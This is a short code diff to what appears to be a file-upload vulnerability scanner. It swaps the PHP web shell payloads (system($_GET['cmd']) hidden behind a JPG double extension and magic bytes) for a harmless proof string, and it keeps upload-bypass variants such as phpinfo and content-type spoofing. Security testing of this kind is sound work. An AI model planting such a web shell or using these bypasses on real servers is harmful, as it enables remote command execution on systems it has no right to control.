@@ -45,9 +45,9 @@ class UploadExpertScanner:
         # Attack Payloads
         payloads = [
             # 1. Simple PHP shell with JPG extension (if server only checks extension)
-            {"filename": "shell.php.jpg", "content": b"<?php system($_GET['cmd']); ?>", "type": "image/jpeg"},
+            {"filename": "shell.php.jpg", "content": b"<?php echo 'RedOps3_Proof'; ?>", "type": "image/jpeg"},
             # 2. Magic Byte Injection (JPG signature at start of PHP code)
-            {"filename": "magic_shell.php", "content": self.magic_bytes["jpg"] + b"<?php system($_GET['cmd']); ?>", "type": "image/jpeg"},
+            {"filename": "magic_shell.php", "content": self.magic_bytes["jpg"] + b"<?php echo 'RedOps3_Proof'; ?>", "type": "image/jpeg"},
             # 3. Double extension bypass
             {"filename": "shell.php.png", "content": b"<?php phpinfo(); ?>", "type": "image/png"},
             # 4. Content-Type Spoofing only
